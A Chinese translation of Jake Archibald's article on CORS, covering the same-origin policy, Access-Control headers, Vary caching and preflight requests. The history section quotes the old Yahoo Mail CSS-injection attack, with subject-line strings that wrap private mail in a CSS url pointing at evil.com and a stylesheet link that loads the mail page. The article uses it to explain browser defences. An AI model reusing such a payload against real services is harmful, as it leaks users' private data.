---
title: 致胜 CORS
date: 2021/11/07 15:40
categories:
- [前端, 自翻, 转载]
tags:
- 转载
- 自翻
---
&emsp;&emsp;转载自翻自[Jake Archibald](https://jakearchibald.com/)的博文[How to win at CORS](https://jakearchibald.com/2021/cors/)。翻译有纰漏和不足之处请多多指教。
<!--more-->
&emsp;&emsp;跨域资源共享 `(CORS -> Cross-Origin Resource Sharing)` 一直是一个老大难的问题，它是浏览器资源请求的一部分，它的一系列特性从最早一批浏览器开始至今已经有近30年的历史。从那时开始，cors 不断的发展，添加新的功能，提升默认能力，在不打破太多的 web 规则下修补过去的错误。

&emsp;&emsp;无论如何，我认为我应该写下我对 CORS 所知的一切，为了让这些内容更形象，我还做了一个 web app [`The CORS playground`](https://jakearchibald.com/2021/cors/playground/)。如果需要的话，你可以马上进入这个网站尝试操作一下，但是我还是觉得你应该先看完这篇文章，了解一些常识示例。

&emsp;&emsp;回归正题，在我介绍如何致胜 CORS 之前，我想解释一下 CORS 到底是什么，为什么会存在，为什么能成为 web 资源请求的一种方式。祝我好运...

## 三方源请求
> 我非常荣幸在此提出一个 HTML 的新标签 IMG，它拥有 SRC 属性，接收一个 url 地址。—— [Marc Andreessen in 1993](http://1997.webhistory.org/www.lists/www-talk.1993q1/0182.html)

&emsp;&emsp;浏览器支持从其它站点获取到图片资源已经有30多年了，你不需要得到其它网站的许可就能使用 IMG 标签获得图片资源。当然了，不单单是 IMG 标签：

```html
<script src="…"></script>
<link rel="stylesheet" href="…" />
<iframe src="…"></iframe>
<video src="…"></video>
<audio src="…"></audio>
```
&emsp;&emsp;上面列举的 HTML 标签，能够在不用获取许可的情况下，以比较特殊的方式向其它网站发起资源请求。一直到1994年，`HTTP cookies` 的诞生让这种资源请求方式安全问题暴露出来。

&emsp;&emsp;`HTTP cookies` 是一些列我们称之为 [授权认证](https://fetch.spec.whatwg.org/#credentials)。这些认证中还包含了 TLS 认证( TLS client certificates) 。这些认证方式使用 HTTP 请求头来自动的获得认证状态。这些认证状态可以通过后端服务进行保存，维持在之后的用户发起的请求中，这就是 `Twitter` 或者 `银行` 能够认证你的账号以及对账号一系列操作的原因。

&emsp;&emsp;在这个背景下，当你使用上面的列举的这些 HTML 标签去请求第三方网站的资源的时候，请求头会带上你在第三方网站的所有认证信息。在当时的情况下，这造成了数不清的巨大安全问题。

```html
<img src="https://your-bank/your-profile/you.jpg" />
```
&emsp;&emsp;以 IMG 标签加载为例。IMG 标签拥有 load 和 error 两个事件，分别在图片加载成功和失败的时候触发。如果这两个事件是根据你是否成功登陆第三方网站来触发的，这就能让我知道你的大部分信息。我还能获取到图片的宽高等信息，这些信息根据用户不同也是不同的。

&emsp;&emsp;事情在 CSS 的相关标签上面变得更糟，CSS 相关的标签比 IMG 标签拥有更多的能力，也不会立刻触发 load 和 error。在2009前后，雅虎邮箱的用户都遭遇过使用 CSS 标签进行的攻击。他们收到两封邮件，一封主题邮件包含字符：`');}`，另一封邮件主题包含字符：`{}html{background:url('//evil.com/?`。

```html
…
<li class="email-subject">Hey {}html{background:url('//evil.com/?</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">Yo ');}</li>
…
```

&emsp;&emsp;你的私人信息像三明治一样被包在 CSS 标签中。接着黑客会诱导用户点击一个包含下面标签的页面：

```html
<link rel="stylesheet" href="https://m.yahoo.com/mail" />
```
&emsp;&emsp;这将会使用`yahoo.com`的 cookies 进行加载，然后把所有的私人信息发送到 `evil.com`，这可太糟了。

## 封锁
&emsp;&emsp;在 web 的设计上，上面的这些资源请求方式犯下了大错，因此我们再也没创建近似于上面请求方式的 API。同时，我们也在过去的数十年一直试图弥补这些错误：
- 第三方的 CSS 请求必须添加 `Content-Type`。不幸的是，我们不能在 script 和 img 标签上做同样的事。

- `X-Content-Type-Options: nosniff header `不允许 CSS 或者 JS 资源在 `Content-Type` 不符合的时候去解析执行 CSS 和 JS。

- `nosniff` 规则随后被扩展到 HTML, JSON, 以及 XML 等类型文件。这种防护方式被称为 [CORB](https://fetch.spec.whatwg.org/#corb)。

- 最近我们不允许在 A 站往 B 站发送请求的带上 B 站的 cookie，除非 B 站特别指明 [SameSite cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) 属性允许这么做。在没有 cookie 访问 B 网站的时候，B 站通常处于未登录的状态，不会存在私密信息。

### 同源策略
&emsp;&emsp;时光回到 1995 年，伴随网景 2 浏览器的落地的还有两个令人惊叹的功能 `LiveScript`(Javascript) 和 HTML frames(iframe)。Frames 让你可以把一个完整的页面嵌入另一个页面，LiveScript 则可以和这两个页面进行交互操作。

&emsp;&emsp;网景意识到这样会造成严重的安全问题，任何人都不会希望一个不知名的恐怖网站能够访问你银行账户网站的所有信息，同源策略应运而生。脚本代码如果是跨越 frame 进行交互，那么只有在同源的情况下才能进行。

```md
同源的含义：
https://jakearchibald.com:443/ (<-源) 2021/blah/?foo#bar
```
&emsp;&emsp;这个安全策略是基于这样思考的：如果网站拥有相同的源的部分，那么这两个网站应该是同一个拥有者开发的。这个想法并不完全正确，因为很多网站是更进一步来进行域名分割和划分的，比如基于`http://example.com/~jakearchibald/`，而不是`http://example.com/`。

&emsp;&emsp;从这之后，很多功能和资源的访问都被限制在同源策略之下，包括1999年 IE5 的`new ActiveXObject('Microsoft.XMLHTTP')`功能，这项功能后来成为web标准 `XMLHttpRequest`。

### 源与站
&emsp;&emsp;一些 web 的功能不是从**源**的角度解决问题，而是**站**。举个例子 `https://help.yourbank.com` 和 `https://profile.yourbank.com`非**同源**，但是它们是**同站**。`Cookies` 在**站**的维度下是最常用的功能，因此应该允许发送创建的 cookies 到 `yourbank.com` 下所有的子域。

&emsp;&emsp;但是浏览器要如何知道 `https://help.yourbank.com` 和 `https://profile.yourbank.com` 是同站的两个子域，而 `https://yourbank.co.uk` 和 `https://jakearchibald.co.uk` 是不同的站点呢？你看…他们可以被点分成三个部分。

&emsp;&emsp;这个问题的解决方案是在每个浏览器中一一列举。但是在2007年 Mozilla 维护了一个列举列表。这个列表现在作为一个社区项目 [public suffix list](https://publicsuffix.org/) 在进行维护，并被浏览器和一些其它项目所使用的。

## 重开
&emsp;&emsp;好了，我们得到这些诸如`<img>`这样可以跨过`源`请求资源的标签，但是请求返回的内容会被限制。（在后来来看，限制的并不够）。我们还有更强力的比如能够跨过 frame 的 `scripting` 还有仅在同源情况下才能使用的 `XMLHttpRequest`。

&emsp;&emsp;我们如何才能用这些 api 来跨源工作呢？

### 移除认证信息
&emsp;&emsp;来看，我们提供一个 [选择性加入](https://baike.baidu.com/item/opt-in/10212924?fr=aladdin)，因此这个请求是没有任何认证信息的，返回值也是一个登出的界面，所以这不可能包含任何的私人信息，所以这个请求可以放心大胆的暴露出去，对吗？

&emsp;&emsp;不幸的是不单单只有浏览器认证信息，数不尽的 HTTP 终端在那里通过各种认证方式“保卫”它们自己。

&emsp;&emsp;许多公司的局域网假定它们是“私有的”，因为他们只能通过特定的方式来访问网络。一些路由和 IoT 设备假定它们只能被特定的访问，因为它们被限定在你的家庭网络环境中。一些网站根据不同的 ip 访问时提供不同的内容。

&emsp;&emsp;所以，如果你在家访问我的网站。我可以开始追踪请求，通过通用的主机名和 ip 地址，查找缺乏安全保护的 IoT 设备，查找那些使用默认密码的路由器，通常能让你的生活变得烦闷不堪，这些都不需要浏览器的认证信息。

&emsp;&emsp;上述情况只是一种情形，但是它不可能知道你的私人数据，我们需要一些方法通过访问资源来申明 “你好，没关系，让其它站点拿到我的内容吧”。

### 独立资源下的请求允许
&emsp;&emsp;源可以指定一些特殊的资源允许跨源访问。这就是
[security model Flash went with](https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html)。Flash 会去查找站点根上面的`/crossdomain.xml`文件，它近似于下面这样：

```xml
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "https://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <site-control permitted-cross-domain-policies="master-only" />
  <allow-access-from domain="*.example.com" />
  <allow-access-from domain="www.example.com" />
  <allow-http-request-headers-from domain="*.adobe.com" headers="SOAPAction" />
</cross-domain-policy>
```
这种方式存在一些问题：
- 改变了整个源的行为。你可以想象到随着你一条条指定资源链接，`/crossdomain.xml` 文件会变得越来越大。
- 原本一次的请求会变为两次。一次是查找 `/crossdomain.xml` 文件。然后根据 `/crossdomain.xml` 文件去访问对应的资源。这个问题比第一个问题要大得多。
- 当大型站点存在多个组进行维护的时候 `/crossdomain.xml` 文件权限问题将会是个大麻烦。

### 内联方式下的请求允许
&emsp;&emsp;为了减少请求数，资源请求被允许可以内嵌到资源中。这项技术是由 W3C 的 `Voice Browser Working Group` 项目组在2005年提出的。使用 XML 来进行声明：
```xml
<?access-control allow="*.example.com" deny="*.visitors.example.com"?>
```
&emsp;&emsp;但是如果请求的资源不是 XML 形式的呢？这就需要使用另外的形式来进行申请。

&emsp;&emsp;这有点像 frame 和 frame 之间进行通信。大部分的站点都使用 [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)，这样就可以申明让源和资源之间能够愉快的进行访问。

&emsp;&emsp;这样的话为什么不在资源中使用字节码的形式呢？HTTP提供了一个地方用于申明资源的属性数据。

### HTTP header 的请求允许
&emsp;&emsp;`Voice Browser Working Group` 提议在HTTP请求头中加入一个跨域资源访问的申明。
```md
Access-Control-Allow-Origin: *
```

## 创建跨域请求
&emsp;&emsp;多数现代浏览器功能都默认限制跨域，比如`fetch()`。但是设计用来兼容老功能的除外，比如`<link rel="preload">`。

&emsp;&emsp;不幸的是判断请求是不是跨域并不简单。比如：

```html
<!-- 非跨域请求 -->
<script src="https://example.com/script.js"></script>
<!-- 跨域请求 -->
<script type="module" src="https://example.com/script.js"></script>
```
&emsp;&emsp;最好分辨的方法是使用开发者工具的 `network` 面板。在 Chrome 和 FireFox 中可以通过[`Sec-Fetch-Mode header`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode)配置告诉你哪些是跨域请求哪些不是。不幸的是 Safari 还不支持这个功能。


&emsp;&emsp;在本文原作者的 [Try it in the CORS playground](https://jakearchibald.com/2021/cors/playground/) 网站中，每当你发送请求时，会记录服务器服务器收到的请求头的日志。当你使用 Chrome 或 FireFox 时，你会看到请求头 `Sec-Fetch-Mode` 中的值为 `cors`，和一些 `Sec-` 开头的有趣请求头在一起。当你调用非跨域标识请求时，`Sec-Fetch-Mode` 的值会为 `no-cors`。

&emsp;&emsp;如果一个 HTML 元素发送了非跨域标识资源请求，你可以加上非常糟糕命名的 `crossorigin` 属性，让它转变为跨域请求。

```html
<img crossorigin src="…" />
<script crossorigin src="…"></script>
<link crossorigin rel="stylesheet" href="…" />
<link crossorigin rel="preload" as="font" href="…" />
```

&emsp;&emsp;当你将这些转变为跨域请求的时候，你可以容易的跨域解析资源：
- 你可以通过绘制 `<img>` 到 `<canvas>` 来读取像素数据。
- 你可以更详细的去追踪脚本栈，尤其是一些[特殊的情况](https://github.com/whatwg/html/issues/2440)。
- 你可以得到额外的功能，比如 [subresource integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#subresource_integrity_with_the_%3Cscript%3E_element)。
- 你可以通过 [link.sheet](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleSheet) 来解析样式表。

&emsp;&emsp;使用`<link rel="preload">`时，你需要确保最后的请求也是用了 CORS，它不会匹配预加载的缓存，最后你会拥有两个请求。

## 跨域请求
&emsp;&emsp;默认情况下，跨域请求会不包含认证信息。所以，没有 cookies，没有证书，没有免登头，而且 `Set-Cookie` 在返回中也会被忽略。不过同源的请求是会包含认证信息的。

&emsp;&emsp;跨域请求随着时间的发展，[`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) 头经常被使用，或者被“国际安全性”软件给移除。所以新的请求头，[`Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) 被创建出出来，提供可让页面访问的源请求。

&emsp;&emsp;`Origin`非常实用，它被添加到个种类型的请求中，比如 `WebSocket` 和 `POST`。浏览器尝试尝试把它添加到 `GET` 请求中，但这样会破坏大批的网站，毕竟拥有 `Origin` 就以为着这是一个跨域请求（大部分网站的get请求都没有写明允许的origin）。也许未来有一天可以实行。

&emsp;&emsp;在本文原作者的 [Try it in the CORS playground](https://jakearchibald.com/2021/cors/playground/) 网站中，每当你发送请求时，会记录服务器服务器收到的请求头的日志，这也包括 `Origin`。如果你创建一个非跨域的 get 请求，Origin 头将不被包含，但是它会出现在对应的 POST 请求当中。

## 跨域返回
&emsp;&emsp;如果想要通过跨域检测，让其他源可以得到返回，返回头必须包含：
```
Access-Control-Allow-Origin: *
```
&emsp;&emsp;其中的`*`可以替换为请求头的 `Origin` 的值。但是 `*` 可以提供任何 origin 的无认证访问。和其它请求头的规定一样，名称是非大小写敏感的，但是里面的值是大小写敏感的。

&emsp;&emsp;在原作者的网站中尝试的话，你会发现下面这些值可以起作用：

- `*`
- `https://jakearchibald.com`

&emsp;&emsp;下面列举的这些都*不起作用*，因为它们不是*，也没有完全匹配（大小写）请求头的 `Origin` 的值。

- `https://jakearchibald.com/` - 结尾多了个 / 意味这没有完全匹配源的值。
- `https://JakeArchibald.com` - 大小写敏感，没有匹配 `Origin` 头。
- `https://jakearchibald.*` - 通配符在这里是无效的。
- `https://jakearchibald.com, https://example.com` - 只能提供一个值。


&emsp;&emsp;合规的值可以让其它源解析返回的内容，以及得到下面这些请求头的值：
- Cache-Control
- Content-Language
- Content-Length
- Content-Type
- Expires
- Last-Modified
- Pragma

&emsp;&emsp;返回也可以包含其它的头信息，通过 `Access-Control-Expose-Headers`，来指定其它额外的头信息。
```
Access-Control-Expose-Headers: Custom-Header-1, Custom-Header-2
```
&emsp;&emsp;规则和上面一样，这里的名称大小写不敏感，值是大小写敏感的。你还可以这么设置：
```
Access-Control-Expose-Headers: *
```
&emsp;&emsp;如果这个请求不带认证信息的话，这样会传递几乎所有的头信息。
&emsp;&emsp;对应的 `Set-Cookie` 相关的信息，比如 `Set-Cookie` 和 `Set-Cookie2` 的头信息永远不会传递，防止跨站点泄露 cookies。

## 跨域和缓存
&emsp;&emsp;跨域请求不会绕过缓存。Firefox 根据请求是否有认证信息来进行分离，Chrome 也计划做同样的事情，但是你仍然需要担心 CDN 的缓存。

### 给跨域请求增加长缓存
&emsp;&emsp;如果你有静态资源需要长时间的缓存，你可以通过改变文件名的方法来标识内容的改变，所以用户可以捡出新的内容。不过，当头信息改变的时候也能做到一样的事情。

&emsp;&emsp;如果你添加 `Access-Control-Allow-Origin: *` 到长信息缓存的资源头中，你需要改变 URL 来保证客户端会重新到你的服务器访问，更新这条信息请求头，而不是拿到缓存版本的请求头。

### 限制跨域请求头
&emsp;&emsp;当一个请求包含私人信息和 cookie，但是你想根据是否存在 cookie 暴露不同的内容，此时最好只把 `Access-Control-Allow-Origin: *` 头放在不含 Cookie 信息的头中。来防止 CDN 或者 浏览器的缓存重复利用包含私人信息的返回头的意外：
1. 浏览器拉取非跨域资源，这个请求包含 cookie 信息。
2. 这个资源的返回包含了私人信息，列入缓存。
3. 浏览器使用跨域方式请求同样的资源，因为是跨域请求，此时不包含 cookies。
4. 命中缓存，返回与之前相同的信息。

&emsp;&emsp;在上面这个例子中，浏览器不会单独发送 cookies 进行二次请求，但是却收到了包含私人信息返回。这是上次请求包含的 cookie 导致的。你不会希望这种返回私人信息的通过跨域检测的情景出现。
&emsp;&emsp;不过上面这种“bug”只会在请求头丢失一个重要申明的时候：
```
Vary: Cookie
```
&emsp;&emsp;这个声明标识“这个版本的缓存只服务于与最早请求cookie相同的请求”。你应该在所以的返回头中加上这个设置，不管这个请求头包含不包含 Cookie。

&emsp;&emsp;我还见过一些服务器，根据请求的 Origin 信息判断是否是 CORS 请求，来条件性地添加`Access-Control-Allow-Origin: *`信息。这是不必要的麻烦，但是如果你坚持要做这些，添加正确的 Vary 头信息就十分的重要：
```
Vary: Origin
```
&emsp;&emsp;一大堆“云存储”服务犯了这个错误。他们条件性地添加 CORS 头，却不添加 Vary 头信息。不要相信这些默认值，确定他们确实做了正确的事。
&emsp;&emsp;Vary 可以根据条件分门别类请求头，如果你在根据 Origin 和 Cookie 来添加 `Access-Control-Allow-Origin: *` 头信息，不如这样：
```
Vary: Origin, Cookie
```

## 暴露资源给 CORS 是否安全？
&emsp;&emsp;如果一个资源永远不包含私有数据，那它可以完全安全的使用`Access-Control-Allow-Origin: *`。现在就这么做！
&emsp;&emsp;如果一个资源根据 cookie 会有私有数据返回，只要你的返回头拥有 `Vary: Cookie`，那么使用 `Access-Control-Allow-Origin: *` 是安全的。
&emsp;&emsp;最后，如果你“保管”类似于需要使用的数据，比如发送人的 IP 地址，或者假定你是安全的，因为网络环境被限制在“内网”，那么使用 `Access-Control-Allow-Origin: *` 一点也不安全。

## 增加认证
&emsp;&emsp;跨域请求默认不包含认证，不过很多的 API 允许你添加认证。
fetch:
```javascript
const response = await fetch(url, {
  credentials: 'include',
});
```
或者 HTML 元素:
```html
<img crossorigin="use-credentials" src="…" />
```
&emsp;&emsp;这让用户许可功能变得更加强大。返回的请求头必须包括：
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://jakearchibald.com
Vary: Cookie, Origin
```
&emsp;&emsp;如果想要跨域头包含认证信息，返回值必须包括 `Access-Control-Allow-Credentials: true` 头信息。而且 `Access-Control-Allow-Origin` 的值必须和发送请求的 `Origin` 相同。

&emsp;&emsp;用户许可功能强大是因为暴露私人数据是敏感的，应该只在你信任的 origins 当中去进行。

&emsp;&emsp;围绕 cookie 的同站策略仍然被接受，就像 Firefox 和 Safari 做的一些隔离策略一样。但是这只解决了跨站的问题，没有解决跨源的问题。

&emsp;&emsp;如果你的返回是可能被缓存的，使用 `Vary` 头非常重要。不单单是针对浏览器的请求，诸如CDN一类的也需要标注。使用 `Vary` 来告诉浏览器和中继器这些返回内容根据特别的请求头，会有不同，不然用户会看到返回内容是返回头 `Access-Control-Allow-Origin` 更新前的错误内容。

## 通常请求和预请求
&emsp;&emsp;目前为止，请求返回都使用选择进入的方式来进行暴露数据。所有的请求都假定为安全的，因为它们没有做任何特殊的事情。

```javascript
fetch(url, { credentials: 'include' });
```
&emsp;&emsp;上面的请求没有任何特殊，这个请求基本上等同于 `<img>` 标签请求资源时做的事情。

```javascript
fetch(url, {
  method: 'POST',
  body: formData,
});
```
&emsp;&emsp;这也没有任何特殊的，因为 `<form>` 标签请求资源时早就在这么做了。

```javascript
fetch(url, {
  method: 'wibbley-wobbley',
  credentials: 'include',
  headers: {
    fancy: 'headers',
    'here-we': 'go',
  },
});
```
&emsp;&emsp;好了，这个请求就很特殊了。

&emsp;&emsp;这么看起来，怎么才算“特殊”的请求，是比较复杂的。但是从宏观来看，浏览器的 API 通常不去做的事情，就是特殊的请求。从微观上面看，如果一个请求的方法不是 `GET`，`HEAD` 或者 `POST`。或者它包含了请求头，或者请求头的值不是[安全列表](https://fetch.spec.whatwg.org/#cors-safelisted-request-header)的一部分，那它就算特殊的。事实上，我最近才[更改过](https://github.com/whatwg/fetch/pull/1312)这部分规则，为了在列表加上一个特殊的 `Range` 头信息。

&emsp;&emsp;如果你想发送一个特殊请求，浏览器会去询问其它源是否能够发送，这个流程被称为预请求（preflight）。

### 预请求
&emsp;&emsp;在发送主请求之前，浏览器会使用 `OPTIONS` 方法发送一个预请求给目标URL，它的请求头信息大概如下：
```
Access-Control-Request-Method: wibbley-wobbley
Access-Control-Request-Headers: fancy, here-we
```
- `Access-Control-Request-Method` - 主请求将要使用的方法。哪怕请求不特殊，这个头也会被使用。
- `Access-Control-Request-Headers` - 主请求将要使用的请求头信息，如果没有特殊的请求头，这个将不会被发送。
&emsp;&emsp;预请求将不会携带认证信息，即使主请求需要携带。

### 预请求返回
&emsp;&emsp;服务器返回将表示是否乐意接受主请求，请求头内容如下：
```
Access-Control-Max-Age: 600
Access-Control-Allow-Methods: wibbley-wobbley
Access-Control-Allow-Headers: fancy, here-we
```
- `Access-Control-Max-Age` - 记录预请求返回的有效时间，再次发送给 URL 的时候避免预请求。这个默认值是5秒。一些浏览器的限制更低，Chrome 中是600秒（10分钟），Firefox 为86400（24小时）。

- `Access-Control-Allow-Method` - 被允许的特殊请求的请求方式。它可以使用逗号分割写多个值，这些值都是大小写敏感的。如果主请求发送不携带认证信息，这里可以使用 `*` 来表示允许任何（大部分）方法。但是因为安全原因，你不能允许 `CONNECT`，`TRACE` 或者 `TRACK` 这些在[禁止列表](https://fetch.spec.whatwg.org/#forbidden-method)上面的方法。

- `Access-Control-Allow-Headers` - 被允许的特殊请求的请求头。值也可以是被逗号分割的多个，但是是非大小写敏感的。因为请求头的名称是非大小写敏感的。主请求如果不喊认证信息，这里的值也可以为 `*` 来允许任何不在 [禁止列表](https://fetch.spec.whatwg.org/#forbidden-header-name) 上的头。

&emsp;&emsp;禁止列表上提到的头信息，因为安全的原因，必须在浏览器的控制管理下。这些在 `Access-Control-Allow-Headers` 或跨域请求上面的值会默默被浏览器过滤掉。

&emsp;&emsp;预请求的返回值必须通过常规的跨域检查，所以它需要 `Access-Control-Allow-Origin`。如果主请求含有认证信息，`Access-Control-Allow-Credentials: true` 这部分内容也是被需要的。而且它的状态码也需要在200-299之间。

&emsp;&emsp;如果特殊请求的特殊请求方法被允许，那么之后所有的特殊请求方式都会被允许，接着主请求就会被发送。

&emsp;&emsp;预请求只会预发送，最终的结果也必须通过跨域检测。

&emsp;&emsp;状态码的限制确实造成了不少麻烦。比如你有一个 `/artists/Pip-Blom` 的 API，你想要在数据库不存在 `Pip Blom` 的时候返回404，这个返回结果想要被用户看见，服务器知道它们被请求的内容是“找不到”，而不是其它的一些服务端错误。但是如果这个请求需要预请求，预请求必须返回200-299的状态码，即使这个结果如上面所说最终是404。

**接下来是一个 Chrome 关于请求方法名的一个 bug。**
&emsp;&emsp;我也是写了这篇文章才发现 Chrome 的 [bug](https://bugs.chromium.org/p/chromium/issues/detail?id=1228178)。

&emsp;&emsp;HTTP 请求方法在某些程度上是大小写敏感的。之所以是“某些程度上”，是因为 `get`，`post`，`head`，`delete`，`options` 或者 `put`，这些公用会自动转为大写，所以拼写时非大小写敏感，但是其它的请求方法会保持你申明的大小写拼写方式。

&emsp;&emsp;不幸的是，Chrome 希望在 `Access-Control-Allow-Methods` 中的值被转为大写。如果你的请求方法为 `Wibbley-Wobbley`，那么预请求会来这么标识：
```
Access-Control-Allow-Methods: Wibbley-Wobbley
```
&emsp;&emsp;然而在 Chrome 中会失败，所以需要这样：
```
Access-Control-Allow-Methods: WIBBLEY-WOBBLEY
```
&emsp;&emsp;虽然在 Chrome 中能通过了，但在其它浏览器中会失败。为了解决这个问题，需要提供两种方法：
```
Access-Control-Allow-Methods: Wibbley-Wobbley, WIBBLEY-WOBBLEY
```
&emsp;&emsp;或者如果请求不需要认证的话，直接使用`*`。

&emsp;&emsp;好了，最后来总结一下。你可以顺着列表在原作者的网站中尝试：

- [通常请求。](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=) 不需要预请求的请求。

- [特殊头。](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=405&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=hello&requestHeaderValue=world) 触发了预请求，但是服务器不通过。

- [又一次特殊请求头。](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=*&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=hello&requestHeaderValue=world) 这次预请求正确的配置了，所以这个请求可以通过。

- [带`range`的请求头。](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=*&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=range&requestHeaderValue=bytes%3D0-) 这是我[修改](https://github.com/whatwg/fetch/pull/1312)的标准。如果浏览器应用了这个标准，这个请求将不需要预请求。目前在 `Chrome Canary` 版本中已经被应用。

- [特殊请求方法。](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=Wibbley-Wobbley&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=Wibbley-Wobbley&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=) 就像前面强调的，这个在 Chrome 中会产生 bug，但是在其它浏览器中正常。

- [又一次特殊请求方法。](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=Wibbley-Wobbley&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=Wibbley-Wobbley%2C+WIBBLEY-WOBBLEY&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=) 这次能够在 Chrome 中正常使用了。

## 哦！
&emsp;&emsp;哇，你看到了最后！这篇文章比我想象的要长，但我希望它能在整个跨域相关的问题上帮到你。

（...省略感谢列表）

[在 github 上观看原文](https://github.com/jakearchibald/jakearchibald.com/blob/main/static-build/posts/2021/10/cors/index.md)